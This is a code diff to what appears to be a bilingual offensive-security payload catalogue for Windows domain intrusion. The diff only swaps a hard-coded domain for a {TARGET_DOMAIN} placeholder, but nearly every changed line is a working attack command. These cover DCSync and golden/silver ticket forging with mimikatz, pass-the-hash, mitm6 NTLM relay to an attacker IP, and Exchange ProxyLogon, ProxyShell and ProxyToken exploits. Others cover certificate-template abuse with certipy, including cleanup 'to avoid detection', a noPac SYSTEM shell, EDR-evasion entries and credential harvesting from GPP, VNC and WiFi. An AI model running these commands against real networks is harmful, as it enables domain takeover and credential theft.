@@ -67,7 +67,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '查询攻击路径', en: 'QueryAttackPath' },
-        command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p',
+        command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@{TARGET_DOMAIN}" RETURN p',
         description: { zh: '查询到域管理员的最短路径', en: 'Shortest path to Domain Admins' },
         platform: 'all'
       }
@@ -100,7 +100,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '查询所有SPN', en: 'QueryallSPN' },
-        command: 'setspn -T domain.com -Q */*',
+        command: 'setspn -T {TARGET_DOMAIN} -Q */*',
         description: { zh: '查询域内所有SPN', en: 'QueryDomainInsideallSPN' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -132,13 +132,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '查询特定服务', en: 'QueryspecificService' },
-        command: 'setspn -T domain.com -Q HTTP/*',
+        command: 'setspn -T {TARGET_DOMAIN} -Q HTTP/*',
         description: { zh: '查询HTTP服务的SPN', en: 'QueryHTTPService SPN' },
         platform: 'windows'
       },
       {
         title: { zh: '查找SQL服务', en: 'FindSQLService' },
-        command: 'setspn -T domain.com -Q MSSQLSvc/*',
+        command: 'setspn -T {TARGET_DOMAIN} -Q MSSQLSvc/*',
         description: { zh: '查询MSSQL服务的SPN', en: 'QueryMSSQLService SPN' },
         platform: 'windows'
       }
@@ -284,7 +284,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '域控制器', en: 'DomainController' },
-        command: 'nltest /dclist:domain.com',
+        command: 'nltest /dclist:{TARGET_DOMAIN}',
         description: { zh: '列出域控制器', en: 'ListDomainController' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -915,7 +915,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '发现SPN', en: 'DiscoverSPN' },
-        command: 'setspn -T domain.com -Q */*',
+        command: 'setspn -T {TARGET_DOMAIN} -Q */*',
         description: { zh: '查询域内所有SPN', en: 'QueryDomainInsideallSPN' },
         platform: 'windows'
       },
@@ -1233,7 +1233,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'PowerShell查找', en: 'PowerShellFind' },
-        command: 'Get-ChildItem -Path "\\\\domain.com\\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\\.xml$"}',
+        command: 'Get-ChildItem -Path "\\\\{TARGET_DOMAIN}\\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\\.xml$"}',
         description: { zh: 'PowerShell查找GPP文件', en: 'PowerShellFindGPPFile' },
         platform: 'windows'
       },
@@ -1505,7 +1505,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'IPv6中继', en: 'IPv6Relay' },
-        command: 'mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh {ATTACKER_IP}',
+        command: 'mitm6 -d {TARGET_DOMAIN} & ntlmrelayx.py -t ldap://dc_ip -wh {ATTACKER_IP}',
         description: { zh: '使用IPv6进行NTLM中继', en: 'UseIPv6 perform NTLMRelay' },
         platform: 'linux'
       }
@@ -1821,7 +1821,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: 'BloodHound分析', en: 'BloodHoundAnalyze' },
-        command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p',
+        command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@{TARGET_DOMAIN}" RETURN p',
         description: { zh: '查询到域管理员的最短路径', en: 'Shortest path to Domain Admins' },
         platform: 'all'
       },
@@ -1839,7 +1839,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '执行DCSync', en: 'ExecuteDCSync' },
-        command: 'mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"',
+        command: 'mimikatz.exe "lsadump::dcsync /domain:{TARGET_DOMAIN} /user:Administrator" "exit"',
         description: { zh: '执行DCSync获取域管哈希', en: 'ExecuteDCSyncGet Domain Adminshash' },
         platform: 'windows'
       },
@@ -1859,7 +1859,7 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: { zh: '隐蔽操作', en: 'Stealthyoperation' },
-        command: 'Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com',
+        command: 'Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.{TARGET_DOMAIN}',
         description: { zh: '指定域控制器操作', en: 'Specify Domain Controlleroperation' }
       }
     ],
@@ -1896,19 +1896,19 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '跨域用户枚举', en: 'CrossDomainUser Enumeration' },
-        command: 'Get-NetUser -Domain target.domain.com',
+        command: 'Get-NetUser -Domain {TARGET_DOMAIN}',
         description: { zh: '枚举目标域用户', en: 'EnumerationTargetDomain Users' },
         platform: 'windows'
       },
       {
         title: { zh: '跨域组枚举', en: 'CrossDomainGroup Enumeration' },
-        command: 'Get-NetGroup -Domain target.domain.com',
+        command: 'Get-NetGroup -Domain {TARGET_DOMAIN}',
         description: { zh: '枚举目标域组', en: 'EnumerationTargetDomainGroups' },
         platform: 'windows'
       },
       {
         title: { zh: 'SID History攻击', en: 'SID HistoryAttack' },
-        command: 'mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"',
+        command: 'mimikatz.exe "kerberos::golden /domain:{TARGET_DOMAIN} /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"',
         description: { zh: '利用SID History跨域提权', en: 'ExploitationSID HistoryCrossDomainPrivilege escalation' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1918,7 +1918,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '跨域票据', en: 'CrossDomainTicket' },
-        command: 'asktgt.exe -domain target.domain.com -user Administrator -hash :HASH',
+        command: 'asktgt.exe -domain {TARGET_DOMAIN} -user Administrator -hash :HASH',
         description: { zh: '请求目标域票据', en: 'RequestTargetDomainTicket' },
         platform: 'windows'
       }
@@ -1926,7 +1926,7 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: { zh: '隐蔽跨域', en: 'StealthyCrossDomain' },
-        command: 'Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com',
+        command: 'Get-NetUser -Domain {TARGET_DOMAIN} -DomainController dc.{TARGET_DOMAIN}',
         description: { zh: '指定目标域控制器枚举', en: 'specifiedTargetDomainControllerEnumeration' }
       }
     ],
@@ -1951,7 +1951,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: 'DCSync攻击', en: 'DCSync Attack' },
-        command: 'lsadump::dcsync /domain:domain.com /user:Administrator',
+        command: 'lsadump::dcsync /domain:{TARGET_DOMAIN} /user:Administrator',
         description: { zh: '模拟DC同步获取域管哈希', en: 'Simulate DC replication to obtain Domain Admin hashes' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1962,7 +1962,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '黄金票据生成', en: 'Golden TicketGenerate' },
-        command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt',
+        command: 'kerberos::golden /domain:{TARGET_DOMAIN} /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt',
         description: { zh: '生成黄金票据并注入', en: 'GenerateGolden Ticket and Injection' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1974,7 +1974,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '白银票据生成', en: 'Silver TicketGenerate' },
-        command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt',
+        command: 'kerberos::golden /domain:{TARGET_DOMAIN} /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt',
         description: { zh: '生成白银票据访问特定服务', en: 'GenerateSilver TicketAccessspecificService' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -2469,7 +2469,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: 'Mimikatz',
-        command: 'sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt',
+        command: 'sekurlsa::pth /user:Administrator /domain:{TARGET_DOMAIN} /ntlm:HASH /ptt',
         description: { zh: '使用哈希获取Kerberos票据', en: 'Using HashObtainKerberosTicket' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -2480,13 +2480,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'Rubeus',
-        command: 'Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt',
+        command: 'Rubeus.exe asktgt /user:Administrator /domain:{TARGET_DOMAIN} /rc4:HASH /ptt',
         description: { zh: '使用Rubeus获取票据', en: 'UseRubeusObtainTicket' },
         platform: 'windows'
       },
       {
         title: 'Impacket',
-        command: 'getTGT.py domain.com/user -hashes :HASH',
+        command: 'getTGT.py {TARGET_DOMAIN}/user -hashes :HASH',
         description: { zh: '获取Kerberos票据', en: 'ObtainKerberosTicket' },
         platform: 'linux'
       }
@@ -3569,7 +3569,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
-        command: 'mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator',
+        command: 'mimikatz # lsadump::dcsync /domain:{TARGET_DOMAIN} /user:Administrator',
         description: { zh: '使用Mimikatz执行DCSync', en: 'UseMimikatzExecuteDCSync' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -3580,13 +3580,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '使用impacket', en: 'Useimpacket' },
-        command: 'python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip',
+        command: 'python secretsdump.py -just-dc-user Administrator {TARGET_DOMAIN}/user:password@dc_ip',
         description: { zh: '使用impacket执行DCSync', en: 'UseimpacketExecuteDCSync' },
         platform: 'linux'
       },
       {
         title: { zh: '导出所有哈希', en: 'Exportallhash' },
-        command: 'mimikatz # lsadump::dcsync /domain:domain.com /all /csv',
+        command: 'mimikatz # lsadump::dcsync /domain:{TARGET_DOMAIN} /all /csv',
         description: { zh: '导出域内所有用户哈希', en: 'ExportDomainInsideallUsershash' },
         platform: 'windows'
       },
@@ -3628,7 +3628,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '生成黄金票据', en: 'GenerateGolden Ticket' },
-        command: 'mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt',
+        command: 'mimikatz # kerberos::golden /user:Administrator /domain:{TARGET_DOMAIN} /sid:S-1-5-21-xxx /krbtgt:HASH /ptt',
         description: { zh: '生成并注入黄金票据', en: 'Generate and InjectionGolden Ticket' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -3641,7 +3641,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '验证票据', en: 'VerifyTicket' },
-        command: 'klist\n或: dir \\\\dc.domain.com\\c$',
+        command: 'klist\n或: dir \\\\dc.{TARGET_DOMAIN}\\c$',
         description: { zh: '验证黄金票据是否有效', en: 'VerifyGolden Ticket is WhetherEffective' },
         platform: 'windows'
       }
@@ -3671,7 +3671,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '生成白银票据', en: 'GenerateSilver Ticket' },
-        command: 'mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt',
+        command: 'mimikatz # kerberos::golden /user:Administrator /domain:{TARGET_DOMAIN} /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt',
         description: { zh: '生成针对特定服务的票据', en: 'GenerateTargeting for specificService Ticket' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -4831,7 +4831,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '利用脚本', en: 'ExploitationScript' },
-        command: 'python proxylogon.py -u https://exchange.com -e admin@domain.com\n获取管理员邮箱访问权限',
+        command: 'python proxylogon.py -u https://exchange.com -e admin@{TARGET_DOMAIN}\n获取管理员邮箱访问权限',
         description: { zh: '利用ProxyLogon', en: 'ExploitationProxyLogon' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -4871,13 +4871,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '利用脚本', en: 'ExploitationScript' },
-        command: 'python proxyshell.py -u https://exchange.com -e admin@domain.com\n获取邮箱访问并执行命令',
+        command: 'python proxyshell.py -u https://exchange.com -e admin@{TARGET_DOMAIN}\n获取邮箱访问并执行命令',
         description: { zh: '利用ProxyShell', en: 'ExploitationProxyShell' },
         platform: 'linux'
       },
       {
         title: { zh: '获取邮件', en: 'Retrieve Emails' },
-        command: 'GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1\n访问邮箱内容',
+        command: 'GET /autodiscover/autodiscover.json?@{TARGET_DOMAIN}/owa/?&Email=admin@{TARGET_DOMAIN} HTTP/1.1\n访问邮箱内容',
         description: { zh: '访问邮箱', en: 'Access Mailbox' },
         platform: 'all'
       }
@@ -4985,13 +4985,13 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '探测ESC2模板', en: 'DetectESC2Template' },
-        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板',
+        command: 'certipy find -u user@{TARGET_DOMAIN} -p password -dc-ip DC_IP\n查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板',
         description: { zh: '探测ESC2模板', en: 'DetectESC2Template' },
         platform: 'linux'
       },
       {
         title: { zh: '请求证书', en: 'RequestCertificate' },
-        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com',
+        command: 'certipy req -u user@{TARGET_DOMAIN} -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@{TARGET_DOMAIN}',
         description: { zh: '请求管理员证书', en: 'RequestManagementMemberCertificate' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5025,19 +5025,19 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '探测ESC3', en: 'DetectESC3' },
-        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找具有Enrollment Agent权限的模板',
+        command: 'certipy find -u user@{TARGET_DOMAIN} -p password -dc-ip DC_IP\n查找具有Enrollment Agent权限的模板',
         description: { zh: '探测ESC3配置', en: 'DetectESC3Configuration' },
         platform: 'linux'
       },
       {
         title: { zh: '获取注册代理证书', en: 'ObtainRegisterProxyCertificate' },
-        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent\n获取注册代理证书',
+        command: 'certipy req -u user@{TARGET_DOMAIN} -p password -ca CA_NAME -template EnrollmentAgent\n获取注册代理证书',
         description: { zh: '获取注册代理证书', en: 'ObtainRegisterProxyCertificate' },
         platform: 'linux'
       },
       {
         title: { zh: '代表其他用户请求证书', en: 'Request Certificates on Behalf of Other Users' },
-        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\\\Administrator -pfx agent.pfx',
+        command: 'certipy req -u user@{TARGET_DOMAIN} -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\\\Administrator -pfx agent.pfx',
         description: { zh: '代表管理员请求证书', en: 'Request Certificates on Behalf of Administrators' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5065,19 +5065,19 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '探测ESC4', en: 'DetectESC4' },
-        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找用户有写权限的模板',
+        command: 'certipy find -u user@{TARGET_DOMAIN} -p password -dc-ip DC_IP\n查找用户有写权限的模板',
         description: { zh: '探测模板权限', en: 'DetectTemplatePermission' },
         platform: 'linux'
       },
       {
         title: { zh: '修改模板配置', en: 'ModifyTemplateConfiguration' },
-        command: 'certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old\n修改模板为ESC1配置',
+        command: 'certipy template -u user@{TARGET_DOMAIN} -p password -template VULNERABLE_TEMPLATE -save-old\n修改模板为ESC1配置',
         description: { zh: '修改模板配置', en: 'ModifyTemplateConfiguration' },
         platform: 'linux'
       },
       {
         title: { zh: '请求证书', en: 'RequestCertificate' },
-        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com',
+        command: 'certipy req -u user@{TARGET_DOMAIN} -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@{TARGET_DOMAIN}',
         description: { zh: '请求管理员证书', en: 'RequestManagementMemberCertificate' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5087,7 +5087,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '恢复模板配置', en: 'RecoveryTemplateConfiguration' },
-        command: 'certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json\n恢复原配置避免检测',
+        command: 'certipy template -u user@{TARGET_DOMAIN} -p password -template VULNERABLE_TEMPLATE -configuration old_config.json\n恢复原配置避免检测',
         description: { zh: '恢复模板配置', en: 'RecoveryTemplateConfiguration' },
         platform: 'linux'
       }
@@ -5111,13 +5111,13 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '探测ESC6', en: 'DetectESC6' },
-        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找EDITF_ATTRIBUTESUBJECTALTNAME2标志',
+        command: 'certipy find -u user@{TARGET_DOMAIN} -p password -dc-ip DC_IP\n查找EDITF_ATTRIBUTESUBJECTALTNAME2标志',
         description: { zh: '探测CA配置', en: 'DetectCAConfiguration' },
         platform: 'linux'
       },
       {
         title: { zh: '请求证书', en: 'RequestCertificate' },
-        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com\n使用-alt参数指定SAN',
+        command: 'certipy req -u user@{TARGET_DOMAIN} -p password -ca CA_NAME -template User -alt administrator@{TARGET_DOMAIN}\n使用-alt参数指定SAN',
         description: { zh: '请求管理员证书', en: 'RequestManagementMemberCertificate' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5151,7 +5151,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '探测ESC8', en: 'DetectESC8' },
-        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找HTTP证书端点',
+        command: 'certipy find -u user@{TARGET_DOMAIN} -p password -dc-ip DC_IP\n查找HTTP证书端点',
         description: { zh: '探测HTTP端点', en: 'DetectHTTPEndpoint' },
         platform: 'linux'
       },
@@ -5191,13 +5191,13 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
-        command: 'python noPac.py domain.com/user:password -dc-ip DC_IP\n检测是否存在漏洞',
+        command: 'python noPac.py {TARGET_DOMAIN}/user:password -dc-ip DC_IP\n检测是否存在漏洞',
         description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
         platform: 'linux'
       },
       {
         title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
-        command: 'python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell\n获取SYSTEM Shell',
+        command: 'python noPac.py {TARGET_DOMAIN}/user:password -dc-ip DC_IP -dc-host DC_NAME -shell\n获取SYSTEM Shell',
         description: { zh: '获取域控权限', en: 'Get Domain ControllersPermission' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5207,7 +5207,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '执行命令', en: 'Execute Command' },
-        command: 'python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"',
+        command: 'python noPac.py {TARGET_DOMAIN}/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"',
         description: { zh: '执行命令', en: 'Execute Command' },
         platform: 'linux'
       }
@@ -5231,13 +5231,13 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
-        command: 'python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator\n检测是否存在漏洞',
+        command: 'python NoAuth.py {TARGET_DOMAIN}/user:password -dc-ip DC_IP -target administrator\n检测是否存在漏洞',
         description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
         platform: 'linux'
       },
       {
         title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
-        command: 'python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator\n获取目标用户TGT',
+        command: 'python NoAuth.py {TARGET_DOMAIN}/user:password -dc-ip DC_IP -target administrator\n获取目标用户TGT',
         description: { zh: '获取TGT', en: 'ObtainTGT' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5603,13 +5603,13 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
-        command: '使用ProxyToken工具:\npython proxytoken.py -u https://exchange.com -e user@domain.com\n检测是否存在漏洞',
+        command: '使用ProxyToken工具:\npython proxytoken.py -u https://exchange.com -e user@{TARGET_DOMAIN}\n检测是否存在漏洞',
         description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
         platform: 'linux'
       },
       {
         title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
-        command: 'python proxytoken.py -u https://exchange.com -e user@domain.com -a\n获取用户邮箱访问权限',
+        command: 'python proxytoken.py -u https://exchange.com -e user@{TARGET_DOMAIN} -a\n获取用户邮箱访问权限',
         description: { zh: '获取邮箱访问', en: 'ObtainMailbox Access' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5666,7 +5666,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '导出邮箱', en: 'Export Mailbox' },
-        command: 'PowerShell:\nNew-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\\\server\\share\\user.pst"\n导出邮箱为PST文件',
+        command: 'PowerShell:\nNew-MailboxExportRequest -Mailbox user@{TARGET_DOMAIN} -FilePath "\\\\server\\share\\user.pst"\n导出邮箱为PST文件',
         description: { zh: '导出邮箱', en: 'Export Mailbox' },
         platform: 'windows'
       }
@@ -5784,7 +5784,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '检查其他敏感安装文件', en: 'CheckotherSensitiveInstallationFile' },
-        command: '# 检查GPP(Group Policy Preferences)密码\nfindstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml 2>nul\n\n# 检查IIS配置文件\ntype C:\\inetpub\\wwwroot\\web.config 2>nul | findstr /i "connectionString password"\n\n# 检查VNC密码文件\nreg query "HKCU\\Software\\ORL\\WinVNC3\\Password" 2>nul\nreg query "HKLM\\SOFTWARE\\RealVNC\\WinVNC4" /v Password 2>nul\n\n# 检查WiFi密码\nnetsh wlan show profiles\nnetsh wlan show profile name="目标WiFi" key=clear',
+        command: '# 检查GPP(Group Policy Preferences)密码\nfindstr /S /I cpassword \\\\{TARGET_DOMAIN}\\sysvol\\{TARGET_DOMAIN}\\policies\\*.xml 2>nul\n\n# 检查IIS配置文件\ntype C:\\inetpub\\wwwroot\\web.config 2>nul | findstr /i "connectionString password"\n\n# 检查VNC密码文件\nreg query "HKCU\\Software\\ORL\\WinVNC3\\Password" 2>nul\nreg query "HKLM\\SOFTWARE\\RealVNC\\WinVNC4" /v Password 2>nul\n\n# 检查WiFi密码\nnetsh wlan show profiles\nnetsh wlan show profile name="目标WiFi" key=clear',
         description: { zh: '除Unattend.xml外，其他位置也可能存储明文凭证', en: 'Besides Unattend.xml, other locations may also store plaintext credentials' },
         platform: 'windows',
         syntaxBreakdown: [
